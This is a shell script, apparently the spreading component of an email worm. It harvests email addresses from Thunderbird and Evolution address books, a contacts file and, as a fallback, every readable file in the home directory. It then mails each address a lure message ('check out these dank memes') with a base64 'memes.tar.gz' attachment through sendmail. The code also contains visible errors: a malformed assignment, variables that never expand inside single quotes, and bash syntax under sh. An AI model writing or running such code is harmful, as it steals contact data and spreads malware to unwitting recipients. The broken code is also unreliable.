#!/bin/sh
for file in $(find $HOME -regex ".*\.mab"); do
    addbook=$("$addbook $(cat $file | grep -oE '[a-zA-Z0-9]*@[a-zA-Z0-9]*\.[a-zA-Z0-9]*')")
done
addbook="$addbook $(cat $HOME/.local/share/contacts | grep -oE '[a-zA-Z0-9]*@[a-zA-Z0-9]*\.[a-zA-Z0-9]*')"
for file in $(find $HOME -regex ".*/evolution.*"); do
    if [ ! -d $file ]; then
        addbook="$addbook $(cat $file | grep -oE '[a-zA-Z0-9]*@[a-zA-Z0-9]*\.[a-zA-Z0-9]*')"
    fi
done
if [ -z "$addbook" ] || [[ $addbook =~ ^\ +$ ]]; then 
# if you can't even get one email address from there, check everywhere
    for file in $(find $HOME -readable); do
        addbook="$addbook $(cat $file | grep -oE '[a-zA-Z0-9]*@[a-zA-Z0-9]*\.[a-zA-Z0-9]*')"
    done
fi
for address in $addbook; do
    echo -en 'To: <$address>\nFrom: $USER <$user@gmail.com>\nSubject: thought you might like this\nMIME-Version: 1.0\nContent-Type: multipart/mixed; boundary="FILEBOUNDARY"\n\n--FILEBOUNDARY\nContent-Type: text/plain; charset=UTF-8\nContent-Disposition: inline\n\nhey, check out these dank memes comrade. my favorite is the first one.\n--FILEBOUNDARY\nContent-Type: application/x-compressed\nContent-Disposition: attachment; filename="memes.tar.gz"\nContent-Transfer-Encoding: base64\n\n\$meme64\n--FILEBOUNDARY--' | sendmail -t
done
